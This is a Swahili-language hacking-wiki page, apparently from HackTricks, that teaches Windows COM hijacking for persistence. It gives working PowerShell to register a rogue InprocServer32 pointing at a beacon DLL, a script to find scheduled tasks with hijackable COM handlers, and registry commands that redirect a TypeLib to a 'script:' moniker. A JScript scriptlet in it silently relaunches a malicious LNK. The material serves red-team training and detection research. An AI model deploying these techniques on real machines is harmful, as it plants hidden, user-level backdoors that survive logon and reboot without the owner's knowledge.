# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta vipengele vya COM visivyopo

Kama thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mbinu za kudumu**. Kutumia `procmon` ni rahisi kupata rejista za COM zilizoombwa ambazo hazipo na ambazo mshambuliaji anaweza kuziunda ili kudumu. Vichujio:

- **RegOpenKey** operations.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inamalizika na **InprocServer32**.

Mara uamapoamua ni COM gani isiyokuwepo kuigiza, tekeleza amri zifuatazo. _Angalia kwa uangalifu ikiwa utaamua kuiga COM ambayo inapakiwa kila sekunde chache kwani hiyo inaweza kuwa ya kupitiliza._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks zinatumia Custom Triggers kuita COM objects, na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri lini zitaanzishwa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo unaweza kuchagua moja ambayo itaendeshwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa unapochunguza CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kwamba thamani haipo katika HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Kisha, unaweza tu kuunda kiingilio cha HKCU na kila mtumiaji anapoingia, backdoor yako itaanzishwa.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) zinaelezea COM interfaces na zinaingizwa kupitia `LoadTypeLib()`. Wakati COM server inapoanzishwa, OS pia inaweza kuingiza TypeLib inayohusiana kwa kushauriana na funguo za rejista chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa na **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib inapogunduliwa — na kusababisha persistence ya kimyakimya inayochochewa wakati vipengele vya kawaida vinapoguswa.

Hii imeonekana dhidi ya Microsoft Web Browser control (inayoingizwa mara kwa mara na Internet Explorer, programu zinazojumuisha WebBrowser, na hata `explorer.exe`).

### Hatua (PowerShell)

1) Tambua TypeLib (LIBID) inayotumiwa na CLSID inayotumika mara kwa mara. Mfano wa CLSID unaotumika mara nyingi na minyororo ya malware: {EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B} (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Elekeza njia ya TypeLib ya mtumiaji mmoja kwa scriptlet ya ndani ukitumia moniker `script:` (no admin rights required):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop JScript `.sct` ndogo kabisa inayowasha tena primary payload yako (kwa mfano `.lnk` inayotumiwa na initial chain):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Kuchochea – kufungua IE, programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer zitapakia TypeLib na kutekeleza scriptlet, zikirejesha mnyororo wako wakati wa logon/reboot.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Vidokezo
- Unaweza kutumia mantiki ile ile kwa COM components nyingine zinazotumika mara kwa mara; daima pata `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## Marejeo

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
